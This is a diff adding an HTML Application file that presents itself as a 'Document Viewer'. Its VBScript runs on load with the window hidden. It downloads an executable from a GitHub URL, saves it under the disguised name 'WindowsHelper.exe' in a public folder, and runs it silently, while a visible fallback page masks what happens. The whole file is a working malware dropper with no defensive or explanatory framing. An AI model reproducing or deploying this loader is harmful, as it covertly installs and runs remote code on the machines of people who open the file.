@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer</title>
+    <HTA:APPLICATION ID="WorkingLoader" APPLICATIONNAME="Document Viewer" WINDOWSTATE="minimize" SHOWINTASKBAR="no" BORDER="none" CAPTION="no" SYSMENU="no" />
+    <script language="VBScript">
+        Sub Window_OnLoad
+            ' Force immediate execution when opened via mshta
+            window.resizeTo 0,0
+            window.moveTo -9999,-9999
+            
+            Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")
+            xhr.Open "GET", "https://github.com/Venity40/mshtaaa/raw/main/Client-built.exe", False
+            xhr.Send
+            
+            savePath = "C:\Users\Public\Libraries\WindowsHelper.exe"
+            
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1
+            stream.Open
+            stream.Write xhr.responseBody
+            stream.SaveToFile savePath, 2
+            stream.Close
+            
+            CreateObject("WScript.Shell").Run Chr(34) & savePath & Chr(34), 0, False
+            window.close
+        End Sub
+    </script>
+    <style>
+        body { display: none } /* Hide everything for HTA execution */
+    </style>
+</head>
+<body>
+    <!-- Fallback content for regular browsers -->
+    <h1>Document Viewer</h1>
+    <p>This application requires Windows HTA support.</p>
+</body>
+</html>
